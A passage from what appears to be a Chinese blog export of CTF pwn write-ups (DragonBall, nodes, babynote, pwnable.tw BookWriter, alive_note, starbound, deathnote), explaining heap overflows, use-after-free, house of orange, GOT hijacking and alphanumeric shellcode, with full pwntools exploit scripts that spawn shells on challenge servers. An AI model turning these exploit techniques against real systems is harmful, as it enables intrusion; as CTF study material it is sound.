ELF('./DragonBall')if debug: p = process('./DragonBall') context.log_level = 'debug'else: p = remote('111.230.132.82', 40002) context.log_level = 'debug'p.recvuntil('You choice: ')p.sendline('1')p.recvuntil('You choice: ')p.sendline('2')for i in range(7): p.recvuntil('You choice: ') p.sendline('1')p.recvuntil('You choice: ')p.sendline('4')p.recvuntil('Tell me your wish: ')payload = asm(shellcraft.sh())payload = payload.ljust(0x66,'a')p.sendline(payload+'b')p.recvuntil('ab')stack_leak = u32(p.recv(5)[1:])print 'stack_leak : ',hex(stack_leak)offset = 0xffa7cc48-0xffa7cbc0payload_addr = stack_leak - offsetprint 'shellcode : ',hex(payload_addr)p.recvuntil('is it right?\n(Y/N) ')p.sendline('a'*0x38+p32(stack_leak)+p32(payload_addr))p.interactive() notes程序的大概内容是程序维护这一个链表，链表各块使用malloc分配，大小为0x38（56）个字节，最开始四字节是一个unsigned int，命名为value，相当于一个索引，之后的48个字节为data，最后四字节为下一个块的地址。 程序利用value值遍历这个链表，找到这个链表的第一个value相同的项进行修改。 在这期间没有任何溢出问题。 漏洞位置漏洞出现的原因有2点 程序利用bss段上的某一个值对data长度进行限定,初始值为48 程序输出是先用sprintf函数拷贝到bss段上某一个位置，在用puts进行打印，而由于该缓存字符串的长度限定有问题，在建立了100个字节以上的节点时，会出现溢出现象，而溢出的点恰好为1中提到的data长度，将其覆盖成为字符’s’，也就是115，进一步造成了堆溢出。 漏洞利用漏洞利用思路是首先构造100个节点，造成堆溢出，此时可以的输入可以覆盖到下一块的地址部分，也就是说可以劫持链表，利用程序功能造成内存任意读写。 首先将某数据库的下一块地址覆盖为puts@got地址，这样利用打印功能可以泄露libc的puts函数地址。 再对该块进行写操作，利用的索引即是泄露的puts地址，因为该块已经在链表中了，将该块地址覆写为一个one_gadget地址，最终利用puts函数的调用触发，即劫持got表。 利用脚本如下：（io貌似还有点问题没有解决） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293from pwn import *import timedebug = 0elf = ELF('./nodes')if debug: p = process('./nodes') libc = ELF('/lib/i386-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('111.230.132.82', 40003) context.log_level = 'debug' libc = ELF('./libc.so.6')def add(value,data): p.recvuntil('please input your choice:') p.sendline('1') p.recvuntil('Value:') p.send(str(value)+'\0') p.recvuntil('Data:') p.sendline('') #time.sleep() p.recvuntil('nodes\n')#def changefor i in range(1,103): add(i,'a')p.recvuntil('please input your choice:')p.sendline('3')p.recvuntil('please input your choice:')p.sendline('2\0')p.recvuntil('Node\'s value:')p.sendline('101')p.recvuntil('New value:')p.sendline('101')p.recvuntil('New data:')p.sendline('a'*48+p32(elf.got['puts']))p.recvuntil('please input your choice:')p.sendline('3')p.recvuntil('Value:101\n')p.recvline()p.recvline()a = p.recvline()puts_addr = int(a[6:-1],10)libc.address = puts_addr - libc.symbols['puts'] print '[+]puts addr:',hex(puts_addr)p.recvuntil('please input your choice:')p.sendline('2')p.recvuntil('Node\'s value:')p.sendline(a[6:-1])p.recvuntil('New value:')p.sendline(str(libc.address+0x3ac5c))p.recvuntil('New data:')p.sendline('')p.recvuntil('choice:')p.sendline('4')p.interactive()'''0x3ac5c execve("/bin/sh", esp+0x28, environ)constraints: esi is the GOT address of libc [esp+0x28] == NULL0x3ac5e execve("/bin/sh", esp+0x2c, environ)constraints: esi is the GOT address of libc [esp+0x2c] == NULL0x3ac62 execve("/bin/sh", esp+0x30, environ)constraints: esi is the GOT address of libc [esp+0x30] == NULL0x3ac69 execve("/bin/sh", esp+0x34, environ)constraints: esi is the GOT address of libc [esp+0x34] == NULL0x5fbc5 execl("/bin/sh", eax)constraints: esi is the GOT address of libc eax == NULL0x5fbc6 execl("/bin/sh", [esp])constraints: esi is the GOT address of libc [esp] == NULL''' babynote一道比较典型的UAF漏洞。 逻辑分析程序逻辑是一个可以任意输入的note，每一个note分为了两部分：block和content block的结构为： 123+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| size（int） | content address | function ptr | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ content的大小为size值 add函数中详细的为每一个变量赋值，尤其是function ptr，初始值为某自实现的puts函数 print函数中显示了调用function ptr函数的参数和方法，可以想到如果可以劫持function ptr就可以执行任意命令 在程序中要求最多可以生成3个note，分别存储在bss段上的一个数组内 利用思路显然，由于在edit的时候并没有检查堆块是否已经被释放，因此，存在明显的UAF(Use After Free)漏洞。 而且删除堆块时程序的释放顺序是先释放content，再释放block，由于fastbin的LIFO性质，可以明显知道 123add（0xc，&apos;p4nda&apos;）delete(0)add(0xc,&apos;p4nda&apos;) 使用的堆块是不变的，因此想要用分配得到的content控制一个note的block，进而控制function ptr的方法必须让堆块分配不平衡。 比如 12345add(0x100,&apos;p4nda&apos;)add(0xc,&apos;p4nda&apos;)delete(1)delete(0)add(0xc,payload) 这样分配，可以导致第0个note的block分配给第2个note的block，而第1个note的block会分配给第二个note作为content，是可以编辑的，进一步可以劫持控制流。 地址泄露此题开启了PIE保护，不可以使用题目文件中的固定地址了。同时需要利用获取system地址，来得到shell，因此泄露一个libc地址是很必要的。 这时存在一个堆块分配与释放的机制问题，堆块在libc的内存管理中主要分fastbin、unsorted bin、 small bin、large bin、top、mmap来管理，其中fastbin管理的是较小堆块，当内存小于global_max_fast值时，在内存释放时会挂载到fastbin中，而稍大一些的small bin、large bin在释放时，当不与top头相邻，会先挂载到unsorted bin中去。 而如何寻找到各个bin的地址？libc在bss段上设置了一个结构体变量叫 main_arena，变量的各个成员就是每个bin的开头，如图 在libc符号表中，没有mainarena的符号，但该地址与\_mallochook很近，通常利用 \_mall_hook来定位main_arena 在各个bin链表中，不同的链表有不同的组织方式，如fastbin是单链表，unsorted bin、small bin是双链表，largebin更为复杂。因此，常用的地址泄露的方式是从unsorted bin泄露，当可以任意读取unsorted bin数据时，堆块的fd位置即为main_arena中unsorted bin地址。 如在此题中就可以用这种方式泄露 劫持控制流12345add(0x100,&apos;p4nda&apos;)add(0xc,&apos;p4nda&apos;)delete(1)delete(0)add(0xc,payload) 当按上述方法控制了第1块的block时，修改payload即可完成对控制流的劫持，如利用泄露的libc地址获取system()地址，将其覆盖到function ptr时，在将size覆盖成 sh\x00\x00，利用print(1)进行触发即可获得一个shell +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | &apos;sh\0\0&apos; | anything | system address | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 利用脚本如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *debug = 0elf = ELF('./babynote')if debug: p = process('./babynote') libc = ELF('/lib/i386-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('111.230.132.82', 40004) context.log_level = 'debug' libc = ELF('./libc.so.6')def add(size,content): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('size:') p.sendline(str(size)) p.recvuntil('content:') p.send(content)def edit(index,content): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('index:') p.sendline(str(index)) p.recvuntil('content') p.send(content)def print_note(index): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('index:') p.sendline(str(index))def delete(index): p.recvuntil('Your choice :') p.sendline('4') p.recvuntil('index:') p.sendline(str(index))add(0x100,'p4nda')add(0xc,'p4nda')delete(1)delete(0)print_note(0)libc_leak_addr = u32(p.recv(4))libc.address = libc_leak_addr - libc.symbols['__malloc_hook']-48-0x18print '[+] system :',hex(libc.symbols['system'])add(0xc,'sh\0\0'+p32(next(libc.search('/bin/sh')))+p32(libc.symbols['system']))print_note(1)p.interactive() 题目]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PWNABLE.TW】 BookWriter 解题思路]]></title>
    <url>%2F2017%2F12%2F15%2Fpwnable-tw-bookwriter%2F</url>
    <content type="text"><![CDATA[背景最开始是发到了看雪论坛上的 最近在学习house_of_orange技术，house_of_orange技术已经和house_of_lore、house_of_Spirit一样，成为一种堆溢出利用技巧，思路来自ctf-HITCON-2016的同名题目。最近学习到这里，看了github上shellphish/how2heap中的讲解和多篇题解对漏洞触发条件依然不太理解，恰巧做到了pwnable.tw上的BookWriter题目，真正实践了一次。 题目分析首先这是一道逻辑清晰的题目，主要有添加书页、浏览书页、编辑书页和查看信息功能。 其中定义了两个int[8]数组在BSS段，分别存储书页的地址和书页内容大小信息，两数组在BSS段上位置相邻。 添加操作使用从0~8顺序查找的方式，进行堆块申请，堆块大小由用户输入，并且用户此时可获得一次输入堆块内容的机会。 查看书页内容操作，用户可输入0~7的数字查询书页内容。 编辑操作，用户同样可输入0~7数字，根据存储在size数组的大小进行写入，并利用strlen函数，重新更新书页的size值。 查看信息。打印一系列信息。 题目中给出的libc.so版本是 2.23 #漏洞分析 堆地址泄露可以主要到bss段上的排列顺序是char author_name[0x40]、int page[8]、int page_size[8]。在输入author_name时，输入长度是0x40，打印时使用%s，造成泄露page中存储的堆地址。 堆溢出堆溢出漏洞有两处，第一处在edit函数中，用户输入完数据后，程序使用strlen函数重置page_size的值，当用户输入与下一堆块中的size相连时，strlen会返回用户输入长度+下一堆块size，再次编辑造成了下一堆块的size被篡改。第二处在于add函数中对允许写入的判断是i&lt;=8,page[i]==NULL。可以发现&amp;page[8] = &amp;page[0]的地址，当page[0]被覆盖为一个堆块地址时，造成了对page[0]超长写入，可以覆盖到很远的地址,可以说是一个等号引发的血案了。 漏洞利用整个程序中没有出现free函数，常规的UAF、Double free都不存在。看了很多的house_of_orange资料，恰好想到使用这种方法，这种攻击成功需要如下条件（shellphish上提供的方法）： heap地址 2. 堆溢出 3. libc地址 4. libc 2.23及以下版本（2.24版本开始对vtable有check，不过也可以绕过） house_of_orange思路简介： 首先修改top块的size，然后申请一个较大的块（不大于mmap申请的阈值，大于top块当前大小），当修改的size满足一定条件时，原来的top会被释放到unsorted bin。 通过堆溢出覆写原top内容，主要是构造IO_file_plus指针中的函数虚表，并伪造bk指针为unsorted bin攻击做铺垫。 当再次申请内存时，造成unsorted bin attack，将\__IO_list_all覆写为原top头地址，由于unsorted bin结构的破坏，程序异常，会在malloc中调用malloc_printerr函数进行错误打印，在malloc_printerr中调用__libc_message，进一步调用abort()，再调用 _IO_flush_all_lockp()，在其中调用了_IO_OVERFLOW(fp,EOF)，这个函数是使用虚表调用，如果可以覆盖调用的虚表，就可以达到执行system(‘/bin/sh’)。 针对上述步骤可以在这道题中一一对照实现。 首先是修改top块的size，可以通过add一个块，edit两次进行对top头size的覆写，经过修改，top的地址与大小如图所示： 这个size块覆写必须满足两点要求，top块才可被释放到unsorted bin 1.size&gt;=MINSIZE 2. pre_inuse 2. top地址+size-1 是页对齐的（以000结尾，比如此题中0x187a020+0xfe1-1 = 0x187b000） 当满足这一点时，再次申请一个较大堆块时就会把这个top块释放到unsorted bin中，值得注意的是，此题有一个在info函数中调用了scanf函数，scanf内部会申请一个0x1000大小的块，且不释放，就可以达到将原top头释放到unsorted bin的目的，并且可以此函数可以泄露堆地址。 由于申请小堆块是从unsorted bin直接切割，可以通过分配得到的堆块泄露libc地址（main_arena+88）。 接下来就可以堆溢出构造unsorted bin攻击了。 首先看漏洞的触发，在genops.c的_IO_flush_all_lockp (int do_lock)函数中，fp会从_IO_list_all开始，当不满足某条件时，循环修改fp = fp-&gt;chain，执行 _IO_OVERFLOW，_IO_list_all是一个_IO_FILE_plus类型的指针，在ibc中。 查看_IO_list_all内容，_IO_list_all是一个_IO_FILE_plus指针，指向_IO_2_2_stdout， 其中包含一个虚表vtable，用于函数调用，包括许多函数 因此，思路可以是通过unsorted bin，将_IO_list_all指针内容修改，可以改到main_arena+88也就是unsorted bin头的地址，当改成这个地址时，其内容时不满足执行_IO_OVERFLOW，转而去寻找位于chain这个位置的地址，继续执行。为了继续构造，可以去把这个地方的地址写成我们能控制内存的地址，这个位置是main_arena+216，是在fastbin链中，堆块大小为0x60的fastbin的地址，可以通过把unsorted bin中的原top挂到fastbin的方法来进一步利用，可把原top头的地址修改成0x61，并且修改bk指针为&amp;_IO_list_all-0x10。这样通过malloc新建堆块时，由于unsorted bin中的堆块不唯一，就会把unsorted bin中堆块释放到bin中去，释放原top头时，会把该块挂载到fastbin[4]，也就是我们期待的位置去，然后再处理bk指针，也就是_IO_list_all，会触发堆块大小为0的错误，进一步触发malloc_printerr 等一系列函数… 下一步就是在原top内伪造_IO_file_plus结构体，满足 1.fp-&gt;mode&gt;0 2._IO_vtable_offset (fp) ==0 3.fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base 即可，构造的结构体如下：（不小心按错退出了，与原先的top地址有变化） 最终malloc一个堆块即可触发漏洞，获得shell EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from pwn import *debug = 1elf = ELF('./bookwriter')if debug: p = process('./bookwriter') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' else: pass def add(num,content): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Size of page :') p.sendline(str(num)) p.recvuntil('Content :') p.send(content)def view(num): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Index of page :') p.sendline(str(num))def edit(num,content): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Index of page :') p.sendline(str(num)) p.recvuntil('Content:') p.send(content)def info(num,content): p.recvuntil('Your choice :') p.sendline('4') p.recvuntil('(yes:1 / no:0) ') p.sendline(str(num)) if(num): p.recvuntil('Author :') p.sendline(content) else: passdef leak_heap(): p.recvuntil('Your choice :') p.sendline('4') p.recvuntil('a'*0x40) result = u64(p.recvline()[0:-1].ljust(8,'\0')) p.recvuntil('(yes:1 / no:0) ') p.sendline('0') return result #int(resultq[0:-1],10)#gdb.attach(p,'b *0x400bdd')p.recvuntil('Author :')p.sendline('a'*0x40)add(0x18,'a'*0x18) #0edit(0,'a'*0x18)edit(0,'\0'*0x18+'\xe1'+'\x0f'+'\0')heap_addr = leak_heap()for i in range(8): add(0x40,'p4nda123')#2view(2)p.recvuntil('p4nda123')libc_addr = u64(p.recvline()[0:-1].ljust(8,'\0')) libc.address = libc_addr - 88 - 0x10 - libc.symbols['__malloc_hook']print 'libc_addr:',hex(libc_addr)print 'system: ',hex(libc.symbols['system'])print 'heap: ',hex(heap_addr)edit(0,'\0'*0x290+'/bin/sh\0'+p64(0x61)+p64(libc_addr)+p64(libc.symbols['_IO_list_all']-0x10)+p64(2)+p64(3)+p64(0)*9+p64(libc.symbols['system']) + p64(0)*11 + p64(heap_addr+0x120+0x60+0x170) ) p.recvuntil('Your choice :')p.sendline('1')p.recvuntil('Size of page :')p.sendline(str(0x10))p.interactive() referencehttps://www.anquanke.com/post/id/84987 https://zhuanlan.zhihu.com/p/31079264?utm_medium=social&amp;utm_source=qq http://www.cnblogs.com/shangye/p/6268981.html https://github.com/shellphish/how2heap/blob/master/house_of_orange.c https://www.sourceware.org/ml/libc-alpha/2016-02/msg00502.html]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PWNABLE.TW】 alive_note 解题思路]]></title>
    <url>%2F2017%2F12%2F06%2Fpwnable-tw-alivenote%2F</url>
    <content type="text"><![CDATA[突然发现已经两个月没写过WP了，愧疚- -… 此题也算一道分数很高的题目，主要考察Shellcode的编写。 题目功能又是一道题目逻辑很简单的题。 首先提供了三个函数 查看，删除，添加 查看函数： 此函数中readint()使用atoi进行解析，没有检查小于0的情况，造成越解读，可以泄露libc地址（然并卵） 添加函数中一样有这个问题，并且可以任意写， 显然是一道覆盖got表的题，并且没有开启NX保护，就是可以写shellcode。 查看一下check函数 不太清楚__ctype_b_loc是什么check，不过可以fuzz一下。 发现只有如下这些是可以输入的 12345678910'''0x0 0x20 0x30 0x31 0x32 0x33 0x34 0x35 0x36 0x37 0x38 0x39 0x41 0x42 0x430x44 0x45 0x46 0x47 0x48 0x49 0x4a 0x4b 0x4c 0x4d 0x4e 0x4f 0x50 0x51 0x520x53 0x54 0x55 0x56 0x57 0x58 0x59 0x5a 0x61 0x62 0x63 0x64 0x65 0x66 0x670x68 0x69 0x6a 0x6b 0x6c 0x6d 0x6e 0x6f 0x70 0x71 0x72 0x73 0x74 0x75 0x760x77 0x78 0x79 0x7a \x00 0 1 2 3 4 5 6 7 8 9 A B C D E F G H I J K L M N O P Q RS T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z''' 而这些机器码构成的汇编就可以做很多事情了，比如参考这个文档给出的汇编指令对应关系 https://wenku.baidu.com/view/bf5227ecaeaad1f346933f86.html 漏洞利用作为其他的限制，shellcode每块不许超过8字节，并且使用strdup建立堆块，也就是说不能有\x00。 根据堆的分配机制，每个堆块分配的大小应该是16字节，并且是连续的，因此可以shellcode链的方法进行跳转，比如使用JNE语句等。 选择覆盖的函数使用free函数，在delete函数时触发，原因是此时在寄存器里会有堆块相关的值。 此时调用free函数时，寄存器的值为： 12345678910111213141516eax 0x811f018 0x811f018 ；堆块地址ecx 0x0 0x0edx 0x0 0x0ebx 0x0 0x0esp 0xffd9597c 0xffd9597cebp 0xffd959a8 0xffd959a8esi 0xf76b7000 0xf76b7000edi 0xf76b7000 0xf76b7000eip 0x80484e0 0x80484e0 &lt;free@plt&gt;eflags 0x296 [ PF AF SF IF ]cs 0x23 0x23ss 0x2b 0x2bds 0x2b 0x2bes 0x2b 0x2bfs 0x0 0x0gs 0x63 0x63 以此寄存器的值构造shellcode，shellcode块之间使用3个小块填充即可 12345678910111213141516171819202122232425'''read(0,heap,size)shellcode 1push eax ;P eax=heappop ecx ;Y push ebx ;Spop eax ;Xpush 0x7a ;jzjnz 0x38 ;u8eax = 0 ebx = 0 ecx = heap edx = 0shellcode 2 pop edx ;Zdec eax ;Hxor byte ptr[ecx+0x46],al ;0a5jnz 0x39shellcode 3xor al,0x33 ;4cxor byte ptr[ecx+0x47],al ;0a5jnz 0x39shellcode 4push 0x33 ;j3pop eax ;Xxor al,0x30 ;40'''+'2L' #EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182from pwn import *debug = 0bad=[]other=[]good = []elf = ELF('./alive_note')context.log_level = 'debug'if debug: p = process('./alive_note') #$libc = ELF('/lib/i386-linux-gnu/libc.so.6') #off = 0x001b2000 context.log_level = 'debug' #gdb.attach(p,'b *0x80488d3') #gdb.attach(p,'b *0x80488C9')else: p = remote('chall.pwnable.tw', 10300) #libc = ELF('./libc_32.so.6')def test(): for i in range(256): p=process('./alive_note') p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Index') p.sendline('1') p.recvuntil('Name :') p.sendline(''+chr(i)) try: res = p.recvline() if('Done' in res): good.append(i) elif ('must be ' in res ): bad.append(i) else: other.append(i) except: bad.append(i) p.close()def add(num,name): p.recvuntil('Your choice :') p.sendline('1') p.recvuntil('Index :') p.sendline(str(num)) p.recvuntil('Name :') p.sendline(name)def show(num): p.recvuntil('Your choice :') p.sendline('2') p.recvuntil('Index :') p.sendline(str(num))def delete(num): p.recvuntil('Your choice :') p.sendline('3') p.recvuntil('Index :') p.sendline(str(num))def padding(): add(9,'p4nda') add(9,'p4nda') add(9,'p4nda')shellcode1 = '''push eax pop ecx push ebx pop eax push 0x7a '''shellcode2 = '''pop edx dec eax xor byte ptr[ecx+0x45],al'''shellcode3='''xor al,0x33 xor byte ptr[ecx+0x46],al '''shellcode4='''push 0x33 pop eax xor al,0x30 '''print asm(shellcode1)if __name__ == '__main__': note = 0x804a080 add((elf.got['free']-note)/4,asm(shellcode1)+'u8') padding() add(0,asm(shellcode2)+'u9') padding() add(1,asm(shellcode3)+'u9') padding() add(2,asm(shellcode4)+'2L') padding() #gdb.attach(p,'b *0x80488ea') #add(1,'PPPPPPP') delete(1) p.sendline('\x90'*0x48+asm(shellcraft.sh())) p.interactive()'''read(0,heap,size)shellcode 1push eax ;P eax=heappop ecx ;Y push ebx ;Spop eax ;Xpush 0x7a ;jzjnz 0x38 ;u8eax = 0 ebx = 0 ecx = heap edx = 0shellcode 2 pop edx ;Zdec eax ;Hxor byte ptr[ecx+0x46],al ;0a5jnz 0x39shellcode 3xor al,0x33 ;4cxor byte ptr[ecx+0x47],al ;0a5jnz 0x39shellcode 4push 0x33 ;j3pop eax ;Xxor al,0x30 ;40''''''eax 0x811f018 0x811f018ecx 0x0 0x0edx 0x0 0x0ebx 0x0 0x0esp 0xffd9597c 0xffd9597cebp 0xffd959a8 0xffd959a8esi 0xf76b7000 0xf76b7000edi 0xf76b7000 0xf76b7000eip 0x80484e0 0x80484e0 &lt;free@plt&gt;eflags 0x296 [ PF AF SF IF ]cs 0x23 0x23ss 0x2b 0x2bds 0x2b 0x2bes 0x2b 0x2bfs 0x0 0x0gs 0x63 0x63'''''' test() print 'good:',good print 'bad:',bad print 'other:',other for i in good: print hex(i),''' '''0x0 0x20 0x30 0x31 0x32 0x33 0x34 0x35 0x36 0x37 0x38 0x39 0x41 0x42 0x43 0x44 0x45 0x46 0x47 0x48 0x49 0x4a 0x4b 0x4c 0x4d 0x4e 0x4f 0x50 0x51 0x52 0x53 0x54 0x55 0x56 0x57 0x58 0x59 0x5a 0x61 0x62 0x63 0x64 0x65 0x66 0x67 0x68 0x69 0x6a 0x6b 0x6c 0x6d 0x6e 0x6f 0x70 0x71 0x72 0x73 0x74 0x75 0x76 0x77 0x78 0x79 0x7a\x00 0 1 2 3 4 5 6 7 8 9 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z''']]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PWNABLE.TW】 starbound 解题思路]]></title>
    <url>%2F2017%2F10%2F13%2Fpwnable-tw-starbound%2F</url>
    <content type="text"><![CDATA[题目功能此题的代码量很大，看了一整天的逻辑代码，没发现什么问题… 整个函数的逻辑主要是红框中两个指针的循环赋值和调用，其中第一个指针是主功能函数，第二个数组是子功能函数。 函数的漏洞主要在main函数中，main函数中使用了strtol函数将用户输入转换为字符串，并根据此转换结果，对子函数进行访问。 当用户输入过大或过小时，会导致越界访问的问题，其中，strtol函数的返回值可能为负数。 bss段中，用户输入的名称最开始是随机生成的，但用户可以更改。而此字段在函数指针数组上面，也就是说，用户可以通过控制名称的方式获得一次指令执行的机会 漏洞利用查看一下安全保护机制 可以使用ROP的方式来利用漏洞。由于main函数中用户可以输入0x100长的字符给v5，因此，v5可作为ROP的存放位置，在name中找到一个gadget使得EIP跳转到位于栈上v5字段内即可。 由于此题没有附带libc，也没找到可以泄露地址的漏洞，因此在ROP中使用了在plt区域有的open、read、puts函数来打印flag，其中从dalao那里get的知识点是，read函数的第一个参数是一个int类型的值， 用于标识文件身份，其中0 ： stdin、1：stdout、2：stderr，本题内没有打开未关闭的文件，因此read(3,&amp;buf,0x10)完全可以读出flag。 另外，恰巧在最近接触到了return to dl-resolve的原理：http://www.freebuf.com/articles/system/149214.html 此题恰巧也符合使用该技术的先决条件，但貌似ld.so做了保护，没有成功，在网上没有找到相关的保护手段，通过调试发现ld.so以偏移量获取了程序.gnu.version的内容，进一步运算，但我构造的偏移量过大， 导致运算超出了可读写的范围，造成程序崩溃。暂未找到其他方法，此坑以后再填。 暂存未成功的return-to-dl-resolve代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *debug = 1context(arch='i386',os='linux',endian='little')context.log_level='debug' elf = ELF('./starbound')if debug: p=process('./starbound') file = '~/Desktop/pwn/tw/starbound/flag'else: p=remote('chall.pwnable.tw',10202)file = '/home/starbound/flag\0\0\0\0'file = '/bin/sh\0' + '\0'*(len(file)-len('/bin/sh\0'))gadget = 0x08048e48bss_function = 0x08058150bss_name = 0x080580D0shellcode = file + p32(gadget) + p32(0x0805509c) + p32(0x00002807) + 'a'*8 print '[*] shellcode len ',len(shellcode)print '[*] ',hex(bss_name + len(shellcode) - 0x80481dc)shellcode = file + p32(gadget) + p32(0x0805509c) + p32(0x00002807) + 'a'*8 + p32(0xe1)+p32(0)+p32(0)+p32(0x12) distance3 = bss_name + len(shellcode) - 0x80484fcprint '[*] ',hex(distance3)shellcode = file + p32(gadget) + p32(0x0805509c) + p32(0x000ff207) + 'a'*8 + p32(distance3)+p32(0)+p32(0)+p32(0x12) + 'system\x00'shellcode = file + p32(gadget) + p32(0x0805509c) + p32(0x00002807) + 'a'*8 + p32(0xe1)+p32(0)+p32(0)+p32(0x12) p.recvuntil('&gt; ')p.send('6')p.recvuntil('&gt; ')p.send('2')p.recvuntil(': ')p.sendline(shellcode)p.recvuntil('&gt; ')distance = (bss_name + len(file) - bss_function)/4#print str(distance) gdb.attach(p,'b *0x0804A65D')distance2 = bss_name + len(file) + 4 - 0x80487c8cat_flag_exp = str(distance-1) + '\0' + 'a'*4 + p32(0x8048940) + p32(distance2) + p32(0xdeadbeef) + p32(bss_name)'''+ p32(elf.symbols['open']) + p32(gadget) + p32(bss_name) \+ p32(0)+ 'a'*(0x1c-8) + p32(elf.symbols['read']) + p32(gadget) + p32(3) + p32(bss_name+20) + p32(0x40) +'a'*(0x1c-12) + p32(elf.symbols['puts']) + p32(0xdeadbeef) + p32(bss_name+20)''''''$ readelf -d starbound | grep JMPREL 0x00000017 (JMPREL) 0x80487c8gdb-peda$ x /2x 0x80487c8+0x1200x80488e8: 0x0805509c 0x00002807readelf -d starbound | grep SYM 0x00000006 (SYMTAB) 0x80481dc 0x0000000b (SYMENT) 16 (bytes) 0x6ffffff0 (VERSYM) 0x80486f2$ readelf -d starbound | grep STRTAB 0x00000005 (STRTAB) 0x80484fc'''p.sendline(cat_flag_exp)p.interactive()#0x08048e48 : add esp, 0x1c ; ret EXP1234567891011121314151617181920212223242526272829303132333435from pwn import *debug = 0context(arch='i386',os='linux',endian='little')context.log_level='debug' elf = ELF('./starbound')if debug: p=process('./starbound') file = '~/Desktop/pwn/tw/starbound/flag'else: p=remote('chall.pwnable.tw',10202)file = '/home/starbound/flag\0\0\0\0'gadget = 0x08048e48shellcode = file + p32(gadget) + 'a'*4p.recvuntil('&gt; ')p.send('6')p.recvuntil('&gt; ')p.send('2')p.recvuntil(': ')p.send(shellcode)p.recvuntil('&gt; ')bss_function = 0x08058150bss_name = 0x080580D0distance = (bss_name + len(file) - bss_function)/4#print str(distance) #gdb.attach(p,'b *0x0804A65D')cat_flag_exp = str(distance-1) + '\0' + 'a'*4 + p32(elf.symbols['open']) + p32(gadget) + p32(bss_name) \+ p32(0)+ 'a'*(0x1c-8) + p32(elf.symbols['read']) + p32(gadget) + p32(3) + p32(bss_name+20) + p32(0x40) +'a'*(0x1c-12) + p32(elf.symbols['puts']) + p32(0xdeadbeef) + p32(bss_name+20)p.sendline(cat_flag_exp)p.interactive()#0x08048e48 : add esp, 0x1c ; ret]]></content>
      <tags>
        <tag>PWN</tag>
        <tag>CTF</tag>
        <tag>PWNABLE.TW</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PWNABLE.TW】 deathnote 解题思路]]></title>
    <url>%2F2017%2F09%2F29%2Fpwnable-tw-deathnote%2F</url>
    <content type="text"><![CDATA[一开始特别懵的一道题。 题目功能题目逻辑比较简单，大概增加和删除和打印三个功能： show函数中，打印各日记内容，由于这题没有给出libc文件，应该不需要泄露地址，估计用处不大： delete函数中，正常的free，然后指针修改为null，可能不存在漏洞，唯一的bug在于read_int()函数中 readint函数使用了atoi函数，当输入是“-12”这样的负数时，造成读越界，但是由于在delete函数中，用处不是特别大 最后，add函数 函数的逻辑是在note数组中写入malloc的返回的指针，并且同样用了readint函数，可以发现存在越界写的问题，而note变量在bss段上，可以想到覆写got表： 漏洞利用检查一下文件开启的保护，没有开启NX保护，也就是可以写入shellcode，这样put@got指向malloc返回地址，malloc块中写入shellcode，便可以获得shell。 而针对用户输入，还有一个函数用来检测， 因此需要保证用户输入范围是从2F~7F范围内。即考察shellcode的编写。 常见的shellcode思路是利用int 80h陷入软中断， 并使得eax内容为0x0b，ebx指向一个字符串”/bin/sh”，ecx、edx置0。如shellcraft.sh() 12345678910111213141516171819202122/* execve(path=&apos;/bin///sh&apos;, argv=[&apos;sh&apos;], envp=0) *//* push &apos;/bin///sh\x00&apos; */push 0x68push 0x732f2f2fpush 0x6e69622fmov ebx, esp/* push argument array [&apos;sh\x00&apos;] *//* push &apos;sh\x00\x00&apos; */push 0x1010101xor dword ptr [esp], 0x1016972xor ecx, ecxpush ecx /* null terminate */push 4pop ecxadd ecx, esppush ecx /* &apos;sh\x00&apos; */mov ecx, espxor edx, edx/* call execve() */push SYS_execve /* 0xb */pop eaxint 0x80 但在汇编以后，不能满足我们的要求。 根据某师傅博客中写到，此题可用的汇编指令如下: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768691.数据传送:push/pop eax…pusha/popa2.算术运算:inc/dec eax…sub al, 立即数sub byte ptr [eax… + 立即数], al dl…sub byte ptr [eax… + 立即数], ah dh…sub dword ptr [eax… + 立即数], esi edisub word ptr [eax… + 立即数], si disub al dl…, byte ptr [eax… + 立即数]sub ah 